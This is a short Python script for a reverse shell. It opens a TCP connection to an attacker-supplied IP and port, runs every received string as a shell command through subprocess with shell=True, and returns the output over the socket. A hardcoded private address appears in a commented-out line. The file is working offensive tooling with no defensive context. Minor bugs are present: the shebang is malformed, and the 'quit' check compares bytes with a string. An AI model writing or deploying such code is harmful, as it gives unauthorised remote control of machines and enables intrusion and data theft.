#/usr/bin/python3

import socket
import sys
import subprocess

# Initiate a test to reach the machine before trying to initiate a shell
#def test_connection(ip, port):
# Try to probe the port by scanning it and if it works then proceed else just exit
# Send a ping packet to the machine then just try to reach it.
# Options, options, options....

# Execute the command via subprocess, this is not best practice since subprocess kicks its own errors
def exec_system_command(command):
    # This kicks off errors when the command is typed incorrect and exits
    return subprocess.check_output(command, shell=True)

# Send commands over the wire with string/byte encoding/decoding
def socket_connect(ip, port):
    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#connection.connect(("192.168.1.6", 2222))
#connection.send(b'\n[+] Got your connection.\n')
    connection.connect((ip, port))
    connection.send(b'[+] connected\r\n')

    while True:
        recv_data  = connection.recv(1024)
        com_result = exec_system_command(recv_data)
        # Data is sent off using this variable. Processed by function which is used by subprocess function
        connection.send(com_result)
        if recv_data == 'quit':
            break
        print(recv_data)

def main():
    ip = sys.argv[1]
    port = int(sys.argv[2])
    socket_connect(ip, port)

main()
